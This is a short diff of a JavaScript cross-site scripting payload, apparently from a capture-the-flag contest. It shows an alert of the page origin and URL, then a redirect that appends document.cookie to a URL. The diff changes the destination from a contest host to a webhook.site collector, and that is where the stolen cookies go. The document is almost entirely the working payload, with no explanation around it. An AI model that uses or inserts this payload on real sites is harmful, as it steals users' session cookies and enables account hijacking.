@@ -1,2 +1,2 @@
 alert('Wow! Origin: ' + location.origin + '\nUrl: ' + top.location.href + '?');
-window.location.href = 'https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru/?c=' + document.cookie;
+window.location.href = 'https://webhook.site/1e8db126-7e39-44f5-aca1-6e4e9d12d791/?c=' + document.cookie;
